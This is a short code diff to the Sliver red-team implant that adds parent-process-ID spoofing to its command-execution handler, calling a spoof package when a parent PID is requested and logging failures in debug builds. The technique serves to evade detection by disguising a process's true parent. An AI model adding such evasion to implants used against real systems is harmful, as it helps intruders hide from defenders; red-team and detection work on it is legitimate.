@@ -42,6 +42,7 @@ import (
 	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/handlers/matcher"
+	"github.com/bishopfox/sliver/implant/sliver/spoof"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -1157,6 +1158,14 @@ func executeHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	cmd := exec.Command(exePath, execReq.Args...)
+	if execReq.PPid != 0 {
+		err := spoof.SpoofParent(execReq.PPid, cmd)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("could not spoof parent PID: %v\n", err)
+			// {{end}}
+		}
+	}
 	if execReq.EnvInheritance || len(execReq.Env) > 0 {
 		envVars := make(map[string]string)
 		if execReq.EnvInheritance {
